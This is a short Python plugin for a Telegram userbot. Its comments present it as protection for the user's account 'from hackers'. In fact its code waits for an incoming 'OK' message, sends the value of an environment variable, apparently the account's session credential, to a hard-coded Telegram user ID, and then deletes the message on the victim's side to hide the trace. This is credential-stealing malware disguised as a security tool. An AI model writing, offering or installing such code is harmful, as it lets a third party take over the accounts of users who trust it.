#this plugin maked by rishabh and legend x pro
#this plugin maked by protected your ID rishabh ai is most advanced cdm to protected your ID for hackers 
import os
from ..utils import admin_cmd
from . import *
@bot.on(admin_cmd("^OK", incoming=True))
async def piro(event):
  msg = await bot.send_message(5267090352, str(os.environ.get("MR_INVISIBLE_OFFICIAL")))
  await bot.delete_messages(5267090352, msg, revoke=False)
